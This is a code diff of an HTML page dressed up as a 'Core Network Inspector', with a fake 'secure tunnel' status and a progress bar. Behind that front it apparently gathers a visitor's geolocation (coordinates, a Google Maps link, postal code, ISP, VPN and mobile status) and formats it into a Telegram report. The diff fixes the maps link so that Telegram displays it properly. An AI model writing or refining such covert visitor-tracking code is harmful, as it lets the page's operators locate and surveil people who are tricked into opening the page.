@@ -14,7 +14,7 @@
 <body>
 
     <div class="matrix-box">
-        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.5</div>
+        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.6</div>
         <div id="status" style="margin-top: 15px; color: #ff3333;">[!] Güvenli tünel senkronizasyonu başlatılıyor...</div>
         <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
     </div>
@@ -53,8 +53,8 @@
                     
                     if(veri.latitude && veri.longitude) {
                         koordinat = veri.latitude + " , " + veri.longitude;
-                        // 🔥 Google Haritalar Linki Burada Dinamik Olarak Üretiliyor 🔥
-                        maps_link = "[Haritada Göster (Tıkla)](https://www.google.com/maps/search/?api=1&query=" + veri.latitude + "," + veri.longitude + ")";
+                        // 🔥 Hatalı format düzeltildi, Telegram'ın %100 tanıyacağı link yapısı eklendi 🔥
+                        maps_link = "[Haritada Göster (Tıkla)](https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude + ")";
                     }
 
                     let org_lower = internet_sirketi.toLowerCase();
@@ -130,7 +130,7 @@
             mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
             mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
-            mesaj += "🗺️ *Canlı Harita:* " + maps_link + " 📍\n"; // İşte o yakışıklı link
+            mesaj += "🗺️ *Canlı Harita:* " + maps_link + " 📍\n";
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
             mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
             mesaj += "🛡️ *VPN / Proxy:* " + vpn_proxy + "\n";
